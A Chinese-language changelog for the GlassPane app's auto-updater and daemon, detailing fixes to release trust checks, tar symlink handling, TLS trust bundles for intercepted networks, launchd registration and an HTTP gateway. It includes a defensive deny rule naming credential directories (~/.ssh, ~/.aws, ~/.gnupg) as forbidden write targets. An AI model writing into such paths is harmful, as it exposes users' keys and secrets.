  `SECURITY.zh-CN.md` 与英文版同步，`scripts/check-doc-links.mjs` 通过。

版本判断（记下来免得下次靠记忆争）：这一批**不改**任何对外契约——状态字段、退出码、CLI 参数、schema、
MCP 工具面都没动；动的是文案里的假路径/假话、恢复分支的触发条件（放宽回它本来宣称的语义）、以及一批
新守卫。按本仓口径记 **1.5.2**（补丁），不是 1.6.0。唯一接近契约变化的是"证书恢复现在也可能在操作者
自己设过同一个路径时介入"，那是把 1.5.0 就写进规格的意图修对，不是新增承诺。


### Fixed — 真机验收第一次把"确实有新版本可装"这条路走通，四条高危同时现形

上面那批修完之后，本机终于出现"装的比发的旧"的状态（`current=1.5.0`、`latest=1.5.1`），于是
`check` 第一次真的走到**下载资产**那一步。结果它一条也没走通过——四条缺陷全都只在"有真实的新 release
且真要下载"时才会露面，此前 271 条 updater 测试没有一条覆盖到那一段：

1. **资产域名钉死把每一份真实 release 都拒了。** 原规则要求资产 URL 与钉死的基址 same-origin
   （`https://api.github.com`），而 GitHub 报文里的 `browser_download_url` 是
   `https://github.com/<slug>/releases/download/<tag>/<file>`。所有夹具写的是
   `api.github.com/.../releases/download/…` —— 一个 GitHub 根本不产出的形状，于是"钉死源"这条判据
   在测试里永远成立、在真机上永远失败。现在放行需三条同时成立：基址仍是钉死的 GitHub API 主机
   （自建镜像不获得这层放宽）、主机在显式列出的发布主机集里（不是后缀匹配）、路径解码后属于**这个仓**
   的那两种形状；同 origin 的 URL 也要过路径这一关，因为 `api.github.com` 上不止放着这一个仓。
   测试里的 URL 逐字取自真机拿回的报文。
2. **档案里的符号链接一律拒绝 ⇒ 真实 release 停在暂存这一步。** `git archive` 会把仓里的符号链接
   原样打进资产（本仓 `harness/…/apple-touch-icon-v3.png` 就是），当时的解包器对 typeflag `2`
   直接 `archive-entry-unsupported`。现在链接一律**物化成档案里目标那份字节的副本**，落盘的树里
   一个链接都不剩（真机那份 24 MiB 档案解出来 `find -type l` 计数为 0）；绝对目标、解析后越界、
   档案里不存在、指向目录、链接指链接、设备与 FIFO 仍全拒，且拒绝发生在写第一个字节之前。
   副本的 mode 跟随**目标文件**——tar 把链接记成 0777，照抄就是在每台机器上多一个人人可写的发布字节
   （真机实测就是 0777）。
3. **六个 CLI 参数从来没生效。** `parseArgs` 把 `--state-dir`/`--apps-dir`/`--daemon-bin`/`--socket`/
   `--at`/`--hour`/`--minute` 写进 `flags.overrides`，而每个消费者读的是 `flags['state-dir']` 这类裸键，
   那个袋子没有任何一处读过。**这里要如实交代我造成的后果**：我用 `check --state-dir /var/tmp/...`
   做真机验收时，它实际解析出的状态根是活的 `~/.glasspane`，于是那份 24 MiB 的暂存树与状态文件的历史
   被写进了这台机器的活状态根（`apply` 从未运行，什么都没被安装）。事后我把那棵暂存树删掉——
   `apply` 对"状态说暂存在、盘上没有"的处置是拒绝并等下一次检查重新暂存（设计内路径），所以定时作业
   不会在无人知会的情况下换版；活的状态文件内容此后未再改动，并在修好之后用 sha256 前后比对证明隔离
   成立。单元测试当时全绿的原因与第 1 条同形：它们直接构造 `runCommand({flags:{…}})` 那个消费者形状，
   从不经过解析器。补的 `cli-options.test.mjs` 里两条用例是**起真子进程**跑的。
   顺带修掉同族的一句假话：`--disable` 的 usage 写着"no-op 别名"却什么都不做——现在它真的选择子命令，
   并拒绝与别的命令同时出现。
4. **一个总时长做不了"这条连接死没死"的判据。** 24 MiB 的资产无人竞争时 39s 下得完，在有竞争的链路上
   被 120s 的 `timeoutMs` 掐死，而报出去的句子是 `GET … failed: This operation was aborted`——既不说
   到了哪条时限，也不说已经收到多少。现在拆成两个时钟：`stallMs`（30s，**每收到一段就重置**）决定死活，
   `timeoutMs`（15min）只兜底防止永远滴流吊死每日作业；两种停止各自说出"停摆时已收到 8.4 MiB"还是
   "600s 没下完（已收到 …）"，都不 stage 半份内容。把"计时器到了"改成能打断假流，靠的是假 `read()`
   也遵守真 fetch 的 abort 语义——否则那条断言测的是夹具自己。

真机验收（本机，node v26.4.0，代理在该链路上做 MITM）：`check --state-dir <沙盒>` 走完
下载 → SUMS 严格解析 → sha256 实测 → 内置 key 的 GPG 签名 verified → 该 commit 上 CI 绿 →
解包（含图标链接的物化）→ 暂存树自己的 `check-version.mjs` ⇒ `status=staged`，退出码 0；
`caRoots` 记 `ok` 163 张且路径落在沙盒里；§9.10 的证书恢复在这条链上真实触发过一次
（先 `release-unreachable`，重导带标记重跑后连上）。

反向变异（本轮 15 条，全红）：放宽两面一起拆 / 同 origin 不再校验形状 / 链接退回一律拒 / 按 destDir
解析链接 / 目标不必在档内 / 指向目录也物化 / 落盘成真链接 / 副本继承 0777 / 不重置停摆计时 /
停摆与超时不说话 / 参数塞回 overrides / `--disable` 退回装饰品 / 别名与别的命令不再矛盾 等。
`gate.sh all` 在同一棵树上 failed=0（engine-test 746/4 skip/0 fail、updater 273、installer 90、
mcp-shell 382、kernel 59、bridge 58、probe 24、signal 自退出且 unlink）。


### Fixed（1.6.0 定稿前的第二轮：§11/§9 落地之后，用真机与实测把它们重核了一遍）

- 交接之后 `apply` 的最后一次状态写覆盖了新那份 `enable` 写的行：那一步现在先读回盘上的文档再合并，
  `enable` 的审计行与它刷新过的 `caRoots` 不再被父进程无声抹掉。
- `runtime/` 的清理按字符串排世代，且只钉住两个指针值。连续两次定时换版后，launchd 定义里那一代既不是
  新指针也不是上一指针值——会被删掉：面板上开关亮着，明早的作业变成 `Cannot find module`。现在钉住
  "新指针 / 上一指针 / 在册作业"三个作者，按版本号定新旧，并且**读不回在册作业就一个都不删**。
- 落地清单从"整棵发布树"收成更新器运行需要的部分。`apply` 在暂存树里构建，产品落在 `engine/.build`
  下（本机实测 509 MB），于是"两代上限"实际是半个 GB；`updater/` 816 K、`installer/` 184 K 才是运行时依赖
  （签名公钥在 `installer/cli.js` 里，少它就是装一个跑不起来的更新器）。
- `fs.cpSync` 不保留相对符号链接，会把它重写成指回暂存树的绝对链接，而那次 `apply` 稍后就删掉暂存树——
  悬空的链接指向 `<状态根>/update-staging/<ver>/…`，下一次 `check` 又用新字节把它填回来。落地树现在拒绝
  任何间接层，`runtime/<ver>` 本身也必须是真目录而不是软链。
- 已存在的一代以前只查 `updater/cli.js` 在不在就被重用：一次 0700 没生效的失败会永久变成"这一代是干净的"。
  现在重用路径重做全部检查，mode 检查也移到标记落地之前，不生效就连根删掉。
- 自更新的在册核对比较的是字符串拼写：node 交给 plist 的路径已经 realpath，状态根是字面量解析，
  于是在 `/tmp`、`/var/tmp` 或任何带软链的家目录上，一次**成功**的换版被永久判成 `runtime-stale`，
  且每条失败路径都不清理、每试一次多留一代。改为按"是不是同一个文件"比较。
- `registerAgent` 曾把 `bootstrap` 退出 0 直接当作"已注册"，并丢掉 `launchctl bootout` 的结果；launchd
  缓存的是 bootstrap 时读到的定义，于是旧作业还在跑而记录说换了。现在装载之后必须把在册作业读回来核对：
  读不回 ⇒ 明说"未核实"（不谎报也不误拒），核对不符 ⇒ 拒绝注册。标签也只能是自己那一个：
  `agentPlistPath`/`registerAgent`/`unregisterAgent` 现在拒绝任何非 `com.glasspane.update` 的标签，因为
  标签决定 `bootout` 打掉谁的作业、plist 以谁的名字落盘。
- 交接跑的 `enable` 不带 `--hour`，会把 `--hour 3` 装出来的机器在每一次自更新时搬回中午，且状态、历史、
  面板、`gp_diagnose` 都没有一句话。现在先读盘上定义的 `StartCalendarInterval` 并沿用，读不到才用默认值
  并说出来。
- `launchctl print` 一行打印一个参数、原样不加转义（本机实测），而本工具自己那份 `-c` 字面量就以引号开头；
  解析器把这种行当畸形拒绝，于是**这个子系统为自己注册的那个作业**永远读不回来，§11 的核对与上面那条
  注册读回都恒为"读不到"。现在只有携带块分隔符（`}`/`{`）的参数行才算不可解码。同时状态根参数的读取
  补上我们渲染进作业的那一种拼法 `--state-root`：只认 `--state-dir` 会让 §2 的外来状态根门对"写别人状态根
  的守护进程"当成"没有这个参数"而放行。
- 交接之后才失败的回滚只还原两个 `.app`，指针与在册作业仍指着被换出去的那一代，而记录写着"已还原并核实"。
  新增 `undoHandover`：指针写回（`registeredAt` 沿用原值，回退不是重新安装）、由旧那份自己重新登记、
  读回核对，结果写进同一句人话。实现它的时候暴露出另一个真实缺陷：`runtime` 声明在 `try` 里面，那段 catch
  一引用就抛 ReferenceError，逃逸到 CLI 后按退出码 3（"什么都没改"）回答一台刚刚被换过两次的机器。
- 读状态时忽略自己不认识的**键**，写仍然严格。定时交接的窗口里跑着的还是旧那份代码，它必须能读新那份写下
  的文档；因为"schema 里多了个不认识的键"而拒绝整份文件，会把一台还能工作的机器读成一台坏的。认不出的
  **取值**仍然拒绝，也仍然不许退回空状态。
- `runtime.js` 的 `RUNTIME_STATUSES`、`update-state.schema.json` 里那份枚举、以及四个真实生产者之间现在
  有一条绑定测试。此前把 `skipped` 从 `runtime.js` 删掉，整套 updater 测试仍然绿——那个取值恰好是定时交接
  这一支产出的。
- 面板文案里两处比证据走得远：`failed` 那一支无条件断言"在册的定时任务还在跑之前那一份"（`enable` 已经
  跑成、下一步才失败的那一支，在册的恰恰是新那一份），以及 `skipped` 开头那句"这一轮没有去动更新器自身"
  （这一轮明明动了代码与指针，只没动作业）。前者改成这一句能断言的上限并附更新器原话，后者改成
  "这一轮没有重新登记定时任务"。
- 一处被测试保住的旧决定没有被"修正"：注册失败时**不**写新的 `caRoots` 记录。束文件此刻确实已经换过，
  但 `caRoots` 记的是"交给那个作业的信任集合"，作业没装上就没有交给谁；在这里写第一份状态文件会让面板
  等一个并不存在的作业。这条是本轮一次自作主张的"修复"被既有测试拦下来的，记录在此以免下次再被"修"回去。

## [1.5.1] — 2026-09-29

### Fixed — 探测 URL 拼成了 `[object Object]`，每台机器的 `caRoots` 都被记成 `probe-failed`

1.5.0 的 §9.8 探测要用 release 端点，代码写成 `` `${resolveBase(env)}${RELATIVE_RELEASE_PATH}` ``，
而 `resolveBase()` 返回的是 `{base, origin, overridden}`。子进程于是拿 `[object Object]/releases/latest`
去 `fetch`，`new URL` 抛 `ERR_INVALID_URL`，`exportCaBundle` 如实降级。真正的伤害不是"少一次探测"，
而是它**指挥用户去改自己机器的信任配置**（那条 remedy 写的是"把拦截根 import 进 System.keychain"），
而坏的只是我一行拼接：安装日志、面板与 `gp_diagnose` 三处一起把一句假阳性说得很有把握。

- 把构造收进可测的 `releaseProbeUrl(env)`：断言它等于 `https://api.github.com/repos/…/releases/latest`、
  解析后 protocol/host/pathname 逐项对上，并且自建镜像基址 `GLASSPANE_UPDATE_BASE` 也必须带上同一条路径
  （否则探测打到别处，又变成一次假的 `probe-failed`）。
- 反向变异实测：把 `.base` 去掉 ⇒ 新用例红；恢复后 `ca-bundle` 16/16、本机 `updater` 全套 246/246。
- 为什么 1.5.0 的测试没抓住：那些用例的 `probeUrl` 是我传进去的字符串常量，缺断言的是 `defaultDeps`
  里的拼接。教训与 §9 那两处同源——**只在真机上跑一次才会露面的，是"桩替掉了生产的那一段"**。
- 暴露它的正是 1.5.0 里那条"探测必须把子进程自己的原因带进记录"的改动：在此之前我只能看到
  `TLS or DNS refused the connection` 这句我自己写的话，还据此怀疑过一次网络抖动。

## [1.5.0] — 2026-09-29

版本判断（记下来免得下次靠记忆争）：这一批不是纯修复 —— 状态文件多了 `caRoots` 字段（schema 变化）、
设置面板多了「系统根证书」那一卡、CLI 多了一条"证书类失败后重导并带标记重跑"的对外行为、安装日志
多了一句必说的结论。按本仓既有口径「对外可见的契约变化按 minor 记」（1.3.0/1.4.0 都是这么定的），
记 1.5.0 而不是 1.4.1；被修掉的那三件（探测语义、plist 严格解析、TLS 永久卡死）都在这一节里。

### Fixed — 网络这一跳的信任：node 不读 macOS 信任库，自动更新在拦截机器上必然装死

第一次在真机上跑 `updater/cli.js check`（198 条测试全是假 HTTP 层，这条路一直没被走过）：
它死在头一道校验之前，报 `release-unreachable — GET … failed: fetch failed`。真因是
`UNABLE_TO_VERIFY_LEAF_SIGNATURE` —— 这台机器的 HTTPS 被本地工具中间人替换（`api.github.com`
的证书签发者是一枚本地根），`curl`/`git`/`gh` 都查 macOS 信任库所以一切正常，**只有 node 的
`fetch` 认自己打包的那份 CA 束**。于是每日 agent 从装好那天起就会天天失败，而面板显示
"automatic update is on"，看起来完全像在工作。企业网关（Zscaler 那类）与各类加速器是同一个形状。

- `<stateRoot>/ca-roots.pem` 由新模块 `updater/lib/ca-bundle.js` **独家**导出：
  `security find-certificate` 对系统根钥匙串 + `System.keychain`（拦截根装在后者，出厂根在前者，
  只导一份就漏），临时文件 + rename + 读回校验，0600。调用点两处：`enable` 注册 agent 时、每次
  `apply` 成功之后（拦截根会轮换）。安装器不自己实现第二份导出——它注册走的正是 `updater enable`。
- 消费者是**进程环境**而不是代码：launchd 的 plist 新增 `EnvironmentVariables.NODE_EXTRA_CA_CERTS`
  （路径经 XML 转义，带 `& < "` 的路径要能原样读回），面板起子进程时带同一个变量。
  node 只在启动那一刻读它，所以不做 re-exec、不改 `NODE_TLS_REJECT_UNAUTHORIZED`；在终端手敲的人
  若没设这个变量，正确行为是**失败并说出 remedy**，而不是悄悄可用。这是**追加**信任：node 仍验证
  完整链，Mozilla 束继续有效；内容安全本来也不靠这条腿——下载字节必须匹配那份由发布 key 签过的
  `SHA256SUMS`。
- 结果记进状态文件的新字段 `caRoots`（五态封闭：`ok` / `empty` / `unavailable` /
  `write-unverified` / `probe-failed`；缺失或 `null` ＝ 旧安装没记录过，不能读成"正常"）。
  `status`、面板「更新」区、`gp_diagnose` 三处都显示这一态。
- 失败文案不再吞真因：TLS 类失败报出 `error.cause.code` 并点名
  `export NODE_EXTRA_CA_CERTS=<那个路径>`；`ECONNREFUSED`、DNS、4xx **不得**套用这句（否则 remedy
  自己变成误导源）。顺带修掉 `answered undefined undefined` 这种没信息量的文案。
- 探测起的是**子进程**而不是在当前进程里设变量：后者证明的是一件没有发生的事。URL 走 argv 传给
  子进程，不进 `-e` 脚本。
- **装到真机上又挖出两处，都当场修掉**：
  ① 探测把"端点答了 403"和"证书验不过"混成同一个 `probe-failed`，remedy 于是指挥人去改信任配置——
  而那次安装之后九分钟，同一个 URL 带着那份束直接回了 200。现在只有传输/TLS 层失败才降级，
  非 2xx 留在 `ok` 并把答复写进 `detail`；且探测必须带上**子进程自己那侧的原因**
  （`REJECT <code> <message>` / `HTTP <status>`），只留退出码＝读的人只能猜。
  ② 渲染出的 agent plist 注释里有 `--state-dir`、`--auto`：XML 注释不允许连续两个连字符，
  `plistlib`/`xmllint` 整份拒收，而 `plutil` 与 launchd 宽容——所以这条缺陷一路通过了所有断言。
  现在有一条用例用严格解析器读渲染结果，并且直接检查注释内不出现该序列。
- **TLS 失败后重导一次束并带标记重跑一次**（用户批准）：束原先只在 `enable`/`apply` 刷新，而一次 TLS
  失败永远走不到 `apply`，于是"机器后来装了新代理"是个会永久卡住的状态。判据是结构化事实
  `tlsVerification`（不匹配自己写的句子）；操作者已给的 `NODE_EXTRA_CA_CERTS` 不覆盖；只重跑一次
  （`GLASSPANE_CA_REEXEC=1`）；argv 逐字、`--json` 那一行只由子进程写；子进程被信号杀死时退 `3` 不退 `0`；
  恢复只挂在可执行入口 `main()`，不挂在库接口 `runCommand()`（安装器是库调用方）。
- 新增测试：`updater/test/ca-bundle.test.mjs`（13 条）、`updater/test/enable.test.mjs`（7 条，
  顺带补上一个此前没人跑过的面——整套测试里 `enable` 从未被 CLI 层驱动过）、`launchd.test.mjs`
  5 条（含"模板丢了 `{{ENV_BLOCK}}` 槽就不许把束交给 job"）、`source.test.mjs` 6 条、
  `apply.test.mjs` 3 条、`tls-recovery.test.mjs` 9 条（含两条走真实 `makeFetcher` 链路的：证书失败必须
  触发恢复、拒连必须一次都不触发）；`installer/test/auto-update.test.mjs` 3 条（注册成功要说出导出了多少张、
  导不出来要转述 updater 的原话、旧 updater 不回报时说"没有回报"而不是给一个看起来可用的默认值），
  并给 `registerAutoUpdate` 加了 `updaterDeps` 接缝——否则安装器的单测会真的去跑
  `security find-certificate` 并起子进程联网探测。面板侧 12 条（含真子进程自报
  `ca-present`/`ca-absent`，分得清"不设"与"设空串"）。
- 规格新增 §9（导出者是谁、刷新点、五态、探测必须在子进程、绝不降级到 http 或关校验），
  每条判据配一行能红测试。

### Fixed — 签名 job 读不到自己那把私钥：`v1.4.0` 发出来仍是无签名的

`v1.4.0` 打出去之后，Release 里只有 `GlassPane-1.4.0.tar.gz` 与 `SHA256SUMS-1.4.0.txt` 两件，没有
`.asc`。日志里那条 warning（"未配置 GPG_PRIVATE_KEY"）说得没错，但它把责任推给了不存在的事实：私钥
**配了**，配在 `release` 环境里，而签名所在的 `github-release` job 没有声明这个环境 —— GitHub 只把
环境级 secret 交给声明了该环境的 job。于是"配了却读不到"在 CI 里与"根本没配"完全同形，而 best-effort
的语义让这一版照常发了货：产物是好的，只是没人签过校验文件，updater 第 8 道对它判 `unsigned-release`，
每一次定时自动更新都会停在 needs-consent —— 一个专门用来"自动更新"的 release 不能被自动更新到。

- `github-release` job 声明 `environment: release`（该环境 `protection_rules` 为空、
  `can_admins_bypass=true`，所以打 tag 不额外需要人工审批）。收编进主仓的 harness 副本有同一处漏声明，
  它的 `checksums` job 也补上了 `environment: release`。
- **签名从 best-effort 改成必须成功**：detect step 与"没配就跳过"的门控删掉，签名步骤无条件执行，
  读不到私钥就直接失败并点名 `gh secret set --env release`。理由就是上面那条后果——宁可这一版发不出去，
  也不发一个下游必然拒绝自动应用的产物。签完还逐件 `[ -s … ]` 复查文件真的落盘：gpg 退 0 不等于签名存在。
- `v1.4.0` 的两份 `.asc` 由本机用同一把 key 事后补签并上传（provenance：CI 之外的路径产生，签的是
  已发布的那两份字节；`SHA256SUMS-1.4.0.txt.asc` 用 installer 内嵌公钥验过，指纹一致）。
  自下一个 tag 起签名重新由 Release 工作流自己完成。

## [1.4.0] — 2026-09-28

### Added — 自动更新（每天定时检查并换版，面板可手动，失败会说话）

用户口径：定时检查 + 自动更新，对象是**已安装的 daemon（.app + launchd 服务）**与 **npm 两个包**；
面板要能手动检查/手动更新，并且在"到点时机器是关的"或"重启失败"这类情况下**提示用户去点**。
契约、判据与每条判据对应的能红测试都在 `specs/GlassPane_规格_自动更新_2026-09-27.md`（§8 是审计之后
追加的硬要求，不是补丁说明）。

- **新工作区 `updater/`**（零运行时依赖，纯 ESM）：`check / apply / status / rollback / enable / disable`
  六个子命令，stdout 恰好一行 JSON，退出码 `0/2/3/4/5` 是契约的一部分（`5` 专指"换了但回滚也没成，
  需要人"）。launchd agent `com.glasspane.update` 每日跑同一条 CLI —— 面板不实现第二套更新逻辑。
- **信任链八道校验，任一不过就不换版**：钉死仓库与 https、tag 语义化且严格更大（major 永不自动应用）、
  产物与校验文件必须成对、`SHA256SUMS` 严格解析（多义即拒，不"取第一个"）、落盘后**实测** sha256、
  解包树自我一致性（跑它自己的 `scripts/check-version.mjs`）、该提交在 main 上必须有 success 的 CI run、
  **这份 release 是谁发布的**（第 8 条，见下条）。状态与面板都显示 sha256 供人核对，major 一律要人点按钮。
- **第八道校验：来源证明（作者性）从假设变成可检查的主张**。发布链侧 `release.yml` 会为
  `GlassPane-<ver>.tar.gz` 与 `SHA256SUMS-<ver>.txt` 各产一份 detached armored 签名（`.asc`，
  配了 `GPG_PRIVATE_KEY` 才生成；这一句当时就不成立——私钥配了而 job 读不到，见上方 `[未发布]`）；
  updater 侧在**一次性隔离 GNUPGHOME**里 `gpg --verify` 校验那份
  校验文件的签名，公钥**动态 import `installer/cli.js` 复用它已导出的那一份**（不在 `updater/` 里抄第二份
  trust anchor——两处必须一致却没人核对的东西，本仓已经栽过两次），结论用词也复用安装器的
  `classifyTagVerify`。四态各有 code 与句子：`verified`（状态文件记下指纹与被验资产）/ `invalid`
  （`signature-invalid`，**硬拒，任何 consent 都不能覆盖**）/ `unsigned-release` /
  `signature-tool-missing`。后两态下**定时运行一律拒绝**（`needs-consent`），人可用新增的
  `--consent unsigned-release` 放行一次，放行之后状态文件与 `gp_diagnose` 摘要会**长期**写明"这一版是
  无作者性证明装上的"。诚实边界：`verified` 的确切含义只是"与我们随代码分发的那把 key 相符"。
  测试：`updater/test/signature.test.mjs`（23 条，含一条真跑 `gpg` 的分支测试——没装 gpg 的机器断言的
  正是"缺失"这条路，绝不静默跳过），`check.test.mjs` 增加 7 条端到端编排用例。
- **什么时候才允许换版**：守护进程单连接串行，所以"探针答得上来"是唯一可证的空闲 —— 构建可能要十几分钟，
  因此每一次 `kickstart` 之前都重新探一次，探不到就 `deferred`，**一次都不重启**；运行中的 job 若带着
  非默认 `--state-dir`，本工具不动它（读 `launchctl print`，读不懂按 fail-closed 处理）。
- **换版与回滚**：先备份（逐文件 sha256 清单 + 读回校验）再动现场，换完用 socket 的 `hello` 与
  `tools/list` 双向核对版本，不符就恢复备份并再次重启核对；恢复本身不可验证是唯一必须人工的结果。
  npm 两个包从**已校验的暂存树**装（不从 registry），装完读回版本，不符即装回原版本。
- **状态与指针**：`<stateRoot>/update-state.json` 与 `update-install.json` 都是 0600、临时文件 + rename
  + 读回校验（在不支持 chmod 的卷上"成功"是静默的）；`status` 是封闭枚举，超过 36 小时没检查就报
  `check-overdue` —— 这条兜住"到点时电脑是关的"。
- **设置面板新增「更新」区**：当前/最新/上次检查/状态/待装版本/暂存校验和，失败原因**原文**显示；
  「立即检查」「安装更新」「自动更新」开关按状态启用，**不可用时给出可见理由而不是隐藏**；
  指针缺失或脚本不存在时如实说要重装，不静默成功。`swift test` 29 条用例覆盖按钮可达性与各种读失败。
- **`gp_diagnose` 现在带上本机新鲜度**（单独一个 content 块，daemon 的 JSON 回复逐字不动）：
  从没跑过更新 = 未知，不是"已是最新"；文件损坏/权限不对/状态不在枚举内 = 说清读不到。
  壳层与 updater 对同一个状态根的解析由一条对照测试钉住（两者都必须按口令库而不是 `$HOME`）。
- **安装器**：安装成功后写指针并注册每日 agent；`--no-auto-update` 或 `GLASSPANE_HTTP… DISABLE=1`
  记为"已关闭"（面板显示关闭而不是"从没检查过"）；缺 `updater/cli.js` 的旧检出照样装成，但要说出
  少了什么；重装幂等，不留两份 agent。

### Fixed — Round 11：审这份新实现与 round 10 的修复

见规格「追加七」与本节上方 §8（审计把 13 条升级为契约）。要点：空闲证据过期、`check` 编排从未被测、
npm 读回不存在、launchd 命令拼接可被路径注入、`launchctl print` 解析在第一处 `}` 截断而放行别人的状态根、
资产 URL 与重定向没钉住、CI 门只要求"存在一个 success run"（文档工作流也算）、执行暂存内容的步骤排在
可信性校验之前、可以换到相同或更旧版本、换版后抛错却报告"什么都没变"、`disable` 按 `$HOME` 解析。

### Fixed — 发布链：`release.yml` 从 09-27 起加载不了，Release 静默停摆

签名步骤写成 `if: ${{ secrets.GPG_PRIVATE_KEY != '' }}`，而 `secrets` 不是 step 级 `if` 的合法
context。GitHub 对这种文件在**解析期**整体作废：不产生任何 job，因此没有任何日志，之后每次触发只留下
一个 0 步、名字是文件路径的红色 run。main 上连着六次 push 都只表现为"又一个看不懂的红灯"，实际后果是
1.3.1 之后一次 Release 都没被创建过——没有 tarball、没有 SHA256SUMS，钉在 tag 上的安装器和自动更新
那八道校验都无从落脚。

- 门控拆成两步：先在一个读得到 secret 的 step 里把"私钥配了没有"写进 `$GITHUB_OUTPUT`，签名步骤再用
  `steps.gpg-key.outputs.present` 判断。没配时前一步显式发 warning 说明这次发布只有校验和、没有来源
  签名，不再静默跳过；两个分支都在本机真跑过。
- 新守卫 `scripts/check-workflows.mjs`（CI job `GitHub Actions workflows compile`，先 `--self-test`
  再扫仓库）：只认两类"解析期就死"的确定形状——非法 context（`if` / `runs-on` / `uses` /
  `environment` 里引用 `secrets`）与同层重复键（merge 时整块手抄最容易造出来）。反向变异已证：把那一行
  改回旧写法，守卫在该行报红、退出码 1。11 条对照里有一半是**不得报**的合法形状（注释里的 `secrets`、
  `run:` 正文里的同名行、`env:` / `with:` 里的 secret 引用）——会把注释当缺陷的扫描器，下一个人就删
  注释换绿，闸静默消失。
- 因果证据是同一条命令的前后对比：修复前 `gh workflow run release.yml` 返回
  `HTTP 422 … failed to parse workflow: (Line: 83, Col: 13): Unrecognized named-value: 'secrets'`，
  修复后被接受并跑绿（dry 模式，不发布任何东西）。
- 当时仍未闭合的一条：仓库与 `release` 环境里都没有 `GPG_PRIVATE_KEY`/`GPG_PASSPHRASE`，所以这一版的
  产物没有 `.asc`——第 8 道校验判 `unsigned-release`，定时更新照设计拒绝自动换版，人可以用
  `updater check --consent unsigned-release` 放行一次。（私钥随后配进了 `release` 环境，但那不能直接被
  这个 job 读到；真正的形状与补签见上方 `[未发布]`。）

## [1.3.1] — 2026-09-27

1.3.0 发布之后连做两轮复审：round 9 审的是**已发布的那份代码**（五维并行，报回 40+ 条、逐条回代码复核后
成立 20 条），round 10 审的是 **round 9 那批修复本身**（三个 lane，成立 12 条）。判据、因果核对与"报回但不
成立"的条目都留了痕：规格 `specs/GlassPane_规格修订_2026-09-23_iterate-round4.md` 的「追加五」「追加六」与
`.iterate_decisions.md` 的 Round 9 / Round 10。

**为什么记 1.3.1 而不是 1.4.0，反方一并写下**：这一版收紧了三处对外输入面 —— `selector.role`/`title` 不再
接受空串（此前 daemon 拒、壳层放行，现在两侧同判）；注册的证据存储根不再允许指向 `~/.ssh` 一类家目录点目录
（daemon 会把注册的根 chmod 0700 并往里写档案）；HTTP 网关拒绝非回环 host 与低于门槛的 bearer token
（**一个原先靠 `GLASSPANE_HTTP_TOKEN=a` 就能起起来的调用方，现在会拒绝启动**，绑不上端口也不再"打一行日志
继续活着"）。按本仓"对外可见的契约变化按 minor 记"的口径，这几条足以判成 1.4.0；选 1.3.1 的理由是它们掐掉的
是**已经在误导用户/代理的可达路径**（错误建议诱导重复点击、`--port=0x50` 意味着 80 端口、`localhost` 去哪里
由 `/etc/hosts` 决定），而不是新增能力。认为该记 minor 的话说一声：改号比发版便宜，发出去就收不回。


### Fixed — Round 10：审 round 9 的修复本身，成立 12 条

判据与因果核对见规格「追加六」。反向变异 12 条全部达到预期红。

- **`canonicalJson` 不再吞掉名为 `__proto__` 的成员**（高危数据面）。排序后的对象此前是 `{}` 字面量，
  对该键赋值命中的是继承来的 setter——成员根本没写进去，而 stdio 每一帧出站文本与转发给代理的 daemon
  正文都过这个函数；daemon 侧的规范化写手把它当普通字典成员输出，于是同一个证据包在两个接入面给出
  不同字节。现在用 `Object.create(null)` 构造，其余输入逐字不变（有等价性用例），并有一条**读 Swift
  源码**的对照，防止两侧再次分叉。
- **传输层重新闭上"点名参数"这条路**：超时 remedy 不再说"缩 maxDepth"（`maxDepth:1` 的调用方收到的
  曾是自家 zod 会拒的指令），可缩旋钮与是否已到界改由拿到 schema 的工具层在同一入口生成；新增一条
  扫描源码的闸，把"参数名 + 方向"这种写法整体禁掉（6 个已知坏写法作正例、3 个允许写法作反例）。
- **迟到帧的归属方式一路走到链上**：无 id 的迟到回复写为 `late-inferred`（按到达顺序猜的，不得读成
  已核实），带 echoed id 的仍是 `late`，`gp_recent_reports` 逐项标注；不抹掉——抹掉等于宣称"这个操作
  没跑过"，那对要不要再点一次的代理是更危险的假。
- **壳层写注册表落实已登记的"就地收紧"**：写完把状态根收成 0700、`projects.json` 收成 0600，并**读回
  校验**（在不支持 chmod 的卷上成功是静默的）；证据根不得指向家目录的点目录（`~/.ssh`、`~/.aws`、
  `~/.gnupg`、`~/.config`、`~/.glasspane`）——daemon 会把注册的根 chmod 0700 并往里写档案。
- **HTTP 网关三条**：只接受回环**地址字面量**，拒绝一切名字（`localhost` 去哪里由 `/etc/hosts` 决定，
  而这正是它拒绝其它名字的理由，旧拒绝文案还自己建议用它）；`GET /v1/evidence?ids=` 的整条扇出共用
  一个预算并点名没取到的 id；CLI 的 `--port` 只接受十进制数字并在解析处报错（`--port=0x50` 曾意味着
  80，`--port=` 意味着随机端口），报错时不创建任何客户端。
- **探针的名字按接入面给**：curl 调用方拿到的超时文案说 `POST /v1/tools/probe_status`，不再给一个它
  只能瞎猜成 `POST /v1/tools/gp_probe_status` 的 MCP 名字；对称的一半也钉住（MCP 文案里不得出现路由）。
- **daemon 那条不可达的 `default:` 建议改写**：它曾带着"授予屏幕录制并重启 daemon"，而分类器的取值
  已全部各有分支 ⇒ 没人走得到；这段"没人走得到但随时会被下一个新标签继承"的文案换成只说"未归因"的话，
  并把闸扩成"连 `default:` 也不得出现授予/重启命令词"。
- **一条不成立的报告留痕**：lane 报"新的总预算没有测试提到，改成 Infinity 也全绿"——实测有具名用例
  且同位置曾一次红 3 条。红与零红都必须自己跑过，别把别人的判断当测量。


### Fixed — Round 9：审的是**已经发出去的 1.3.0**，五维并行复审后成立的 20 条（8 高）

判据与因果核对见 `specs/GlassPane_规格修订_2026-09-23_iterate-round4.md`「追加五」与
`.iterate_decisions.md` 的 Round 9。下面每一条都有反向变异：把修复撤销 → 对应测试必须红（13 条变异，
第 8 条当时零红，于是为它补了一道闸，补完再跑即红）。

- **无 id 的帧按 daemon 的到达顺序归因，而不是按"还有谁在等"**。旧实现把注释里的"oldest unanswered"
  写成了"oldest unsettled"：`act` 超时后代理照 remedy 发探针，daemon 给那条 act 的无 id 错误会被当成
  探针的答案交给探针调用方（连 remedy 一起），探针自己随后被报成"客户端从没发过"；另一支则把它说成
  "没有请求在飞"，那次真实执行过的操作因此**没进证据链**——正是 R8-高3 要消灭的"再点一次"。
- **不可重放的方法集合改成传输层唯一导出**（`isReplayUnsafeMethod`），`tools.ts` 与 `http-gateway.ts`
  只保留各自文案。此前同一策略抄了三份，而 `gp_act` 的回复超帧时两套建议都在说"换个更具体的 selector
  重试"——那是在命令第二次点击。现在不可重放的工具拿到的是"不要重发，去读 `gp_recent_reports` /
  `gp_last_evidence` / `gp_observe`"。
